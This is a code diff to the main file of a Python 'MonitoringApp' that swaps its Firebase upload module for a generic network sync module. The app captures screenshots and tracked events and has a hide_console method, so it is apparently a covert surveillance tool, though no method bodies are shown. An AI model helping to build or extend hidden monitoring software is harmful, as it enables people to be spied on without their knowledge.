@@ -12,7 +12,7 @@ from config import Config
 from storage_manager import StorageManager
 from event_tracker import EventTracker
 from screenshot_manager import ScreenshotManager
-from firebase_sync import FirebaseSync
+from network_sync import NetworkSync
 
 class MonitoringApp:
     """Main monitoring application"""
@@ -21,7 +21,7 @@ class MonitoringApp:
         self.storage_manager = None
         self.event_tracker = None
         self.screenshot_manager = None
-        self.firebase_sync = None
+        self.network_sync = None
         self.running = False
     
     def hide_console(self):
@@ -49,12 +49,8 @@ class MonitoringApp:
         # Initialize screenshot manager
         self.screenshot_manager = ScreenshotManager(self.storage_manager)
         
-        # Initialize Firebase sync (if credentials exist)
-        firebase_creds = None
-        if os.path.exists(Config.FIREBASE_CREDENTIALS_PATH):
-            firebase_creds = Config.FIREBASE_CREDENTIALS_PATH
-        
-        self.firebase_sync = FirebaseSync(self.storage_manager, firebase_creds)
+        # Initialize network sync
+        self.network_sync = NetworkSync(self.storage_manager)
     
     def start(self):
         """Start all monitoring components"""
@@ -69,8 +65,8 @@ class MonitoringApp:
         # Start screenshot capture
         self.screenshot_manager.start()
         
-        # Start Firebase sync
-        self.firebase_sync.start()
+        # Start network sync
+        self.network_sync.start()
     
     def stop(self):
         """Stop all monitoring components"""
@@ -82,8 +78,8 @@ class MonitoringApp:
         if self.screenshot_manager:
             self.screenshot_manager.stop()
         
-        if self.firebase_sync:
-            self.firebase_sync.stop()
+        if self.network_sync:
+            self.network_sync.stop()
     
     def run(self):
         """Main run loop"""
